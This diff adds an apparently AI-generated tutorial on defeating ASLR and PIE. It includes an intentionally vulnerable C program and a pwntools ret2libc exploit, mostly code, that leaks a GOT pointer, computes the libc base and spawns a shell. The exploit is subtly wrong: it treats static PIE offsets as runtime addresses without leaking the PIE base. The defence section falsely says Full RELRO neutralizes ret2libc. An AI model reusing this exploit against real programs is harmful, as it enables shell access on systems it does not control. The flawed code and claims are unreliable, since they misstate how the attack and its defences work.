@@ -1,1 +1,130 @@
+When ASLR (Address Space Layout Randomization) and PIE (Position Independent Executable) are both fully enabled, memory addresses become moving targets. Every time the program runs, the operating system randomizes the base address of the main executable (PIE base) and the C library (libc base). You can no longer hardcode addresses in your exploit script.
+To bypass these mitigations, an exploit must be mitigation-driven, turning a single vulnerability into a multi-stage process: Leak -> Calculate -> Execute.
+
+1. The Mitigation-Driven Strategy
+
+To weaponize a buffer overflow under full randomization, your exploit must perform two distinct stages:
+text
+STAGE 1: THE LEAK & RE-ENTRY
+[ Overflow Buffer ] -> [ Leak a function pointer via write() / puts() ] -> [ Jump back to main() ]
+                                                                                   |
+                                                                                   v
+STAGE 2: THE HIJACK                                                                |
+[ Recalculate libc base ] -> [ Run Overflow again ] -> [ Execute system("/bin/sh") ] <---+
+Use code with caution.
+1. Stage 1 (Information Leak): Overwrite the return address with a ROP chain that prints the runtime address of a function stored in the Global Offset Table (GOT) (e.g., puts). Crucially, the end of this ROP chain must jump straight back to main(). This restarts the program without re-randomizing memory layout (the ASLR slide remains identical until the process completely terminates).
+2. Base Calculation: Capture the leaked address over the network. Subtract its static offset (found in the binary/libc file) to find the exact, live libc base address.
+3. Stage 2 (The Hijack): Because the program is running safely in main() again, trigger the buffer overflow a second time. Since you now know the exact libc base, you can calculate the absolute runtime locations of system() and the "/bin/sh" string to execute a shell.
+
+2. The Vulnerable C Program (protected_vuln.c)
+
+This binary features an intentional buffer overflow but provides absolutely no helper functions like win().
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vulnerable_function() {
+    char buffer[64];
+    printf("Enter data: ");
+    // VULNERABILITY: read() accepts 256 bytes into a 64-byte buffer
+    read(0, buffer, 256); 
+}
+
+int main() {
+    // Unbuffer stdout to ensure immediate network transmission
+    setbuf(stdout, NULL);
+    vulnerable_function();
+    return 0;
+}
+Use code with caution.
+
+Compilation (Full ASLR/PIE Mitigations)
+
+bash
+gcc -m32 -fno-stack-protector -fPIE -pie protected_vuln.c -o protected_vuln
+Use code with caution.
+
+3. The Python Mitigation-Driven Exploit (bypass_aslr.py)
+
+Using pwntools, we script the two-stage payload delivery, parsing the binary assets on the fly to bypass full address randomization.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Context for a 32-bit Linux environment
+context.update(arch='i386', os='linux')
+
+# Load the local binary and its accompanying C library for static offset lookups
+elf = ELF('./protected_vuln')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6') # Path varies by OS/system config
+
+io = process('./protected_vuln')
+
+# Distance to reach the return address (64 buffer + 12 compiler padding)
+offset = 76
+
+# ========================================================
+# STAGE 1: CONSTRUCTING THE INFO LEAK
+# ========================================================
+# Even with PIE/ASLR on, relative offsets inside the PLT/GOT are static.
+# We call puts() via the PLT to print out the real runtime address of puts() inside the GOT.
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_address = elf.symbols['main']
+
+log.info(f"Statically known PLT puts call: {hex(puts_plt)}")
+log.info(f"Statically known GOT target pointer: {hex(puts_got)}")
+
+# Build Stage 1 Payload:
+# [Padding] + [puts@PLT] + [Return to main()] + [Argument for puts: puts@GOT]
+stage_1_rop = p32(puts_plt) + p32(main_address) + p32(puts_got)
+payload_1 = b"A" * offset + stage_1_rop
+
+# Deploy Stage 1
+io.recvuntil(b"Enter data: ")
+log.info("Deploying Stage 1 ROP chain to trigger memory leak...")
+io.sendline(payload_1)
+
+# Parse the leaked 4-byte address from the stdout stream
+leaked_bytes = io.recv(4)
+runtime_puts = u32(leaked_bytes)
+log.success(f"Leaked runtime puts() location: {hex(runtime_puts)}")
+
+# ========================================================
+# BASE CALCULATION
+# ========================================================
+# Calculate the absolute randomized libc base on the fly
+libc_base = runtime_puts - libc.symbols['puts']
+log.success(f"Calculated live Libc Base Address: {hex(libc_base)}")
+
+# Recalculate target positions using the verified libc base
+actual_system = libc_base + libc.symbols['system']
+actual_bin_sh = libc_base + next(libc.search(b"/bin/sh"))
+
+log.info(f"Calculated actual system() destination: {hex(actual_system)}")
+log.info(f"Calculated actual /bin/sh string location: {hex(actual_bin_sh)}")
+
+# ========================================================
+# STAGE 2: EXECUTE THE CONTROL HIJACK
+# ========================================================
+# The program has returned safely to main(). We execute the overflow again.
+# Build Stage 2 Payload:
+# [Padding] + [system() address] + [Dummy Return Address] + [Pointer to "/bin/sh"]
+stage_2_rop = p32(actual_system) + p32(0xdeadbeef) + p32(actual_bin_sh)
+payload_2 = b"A" * offset + stage_2_rop
+
+io.recvuntil(b"Enter data: ")
+log.info("Deploying Stage 2 ROP chain targeting the newly calculated shell addresses...")
+io.sendline(payload_2)
+
+# Seamless transition into the active interactive shell
+io.interactive()
+Use code with caution.
+
+4. Defending Against Mitigation-Driven Attacks
+
+While ASLR and PIE are necessary, they are not silver bullets because they do not fix the root memory corruption flaw. To permanently secure applications:
+• Compile with Full RELRO (-z relro -z now): Full RELRO (Relocation Read-Only) resolves all dynamic library symbols during program startup and marks the entire Global Offset Table (GOT) as strictly read-only. This prevents attackers from hijacking functions by overwriting GOT entries, completely neutralizing techniques like Ret2libc or GOT corruption.
+• Enforce Strict Stack Canaries (-fstack-protector-strong): Canaries act as the ultimate defense against basic sequential overflows. By placing a secret random value right before the return address, an attacker cannot complete Stage 1 of the ROP leak without corrupting the canary and forcing an immediate program abort.
 
